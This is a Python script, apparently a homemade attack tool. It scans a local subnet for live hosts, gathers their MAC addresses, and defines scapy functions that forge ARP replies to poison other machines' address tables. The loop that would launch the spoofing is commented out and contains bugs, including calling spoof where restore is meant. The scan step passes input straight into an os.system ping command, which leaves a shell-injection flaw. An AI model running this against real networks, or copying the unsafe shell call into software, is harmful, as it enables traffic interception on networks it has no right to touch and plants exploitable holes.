import os
import multiprocessing
from getmac import get_mac_address
from scapy.all import srp, send
from scapy.layers.l2 import Ether, ARP
import argparse
import time

def scan(target, DefaultGateway, TargetDict):
    if target == DefaultGateway:
        return
    response = os.system("ping " + target)
    if response == 0:
        print(target + " is live")
        TargetDict[target] = get_mac_address(ip=target)
    print(response)

def spoof(target_ip, host_ip, verbose = True):
    target_mac  = get_mac_address(ip = target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose = 0)
    if verbose:
        self_mac = ARP.hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

def restore(target_ip, host_ip, verbose = True):
    target_mac = get_mac_address(ip=target_ip)
    host_mac = get_mac_address(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op='is-at')
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))

if "__main__" == __name__:

    DefaultGateway = input("Enter the default gateway: ") #192.168.1.1
    ScanAmount = int(input("Enter the amount of address you want to scan: "))

    Manager = multiprocessing.Manager()
    TargetDict = Manager.dict()
    #
    SplitedDefGate = DefaultGateway.split(".") # ["192","168","1","1"]
    NetAddr = SplitedDefGate[0] + "." + SplitedDefGate[1] + "." + SplitedDefGate[2] + "." # 192.168.1.

    processes = []

    for i in range(ScanAmount):
        TargetAddr = NetAddr + str(i)
        p = multiprocessing.Process(target=scan, args = (TargetAddr,DefaultGateway, TargetDict))
        p.start()
        processes.append(p)

    for process in processes:
        process.join()

    for x,y in TargetDict.items():
       if TargetDict[x] != None:
           print(f"{x} : {y}")
    #
    # attacks = []
    # restores = []
    #
    # try:
    #     while True:
    #         for key, value in TargetDict.items():
    #             a = multiprocessing.Process(target=spoof, args = (TargetAddr,key, verbose))
    #             a.start()
    #             attacks.append(p)
    #         for attack in attacks:
    #             attack.join
    #         time.sleep(1)
    # except KeyboardInterrupt:
    #     print ("!Detected CTRL+C")
    #     for key, value in sorted(TargetDict.items()):
    #         r = multiprocessing.Process(target=spoof, args = (TargetAddr,key, verbose))
    #         r.start()
    #         restores.append(r)
    #     for restore in restores:
    #         restore.join()
    #     time.sleep(1)


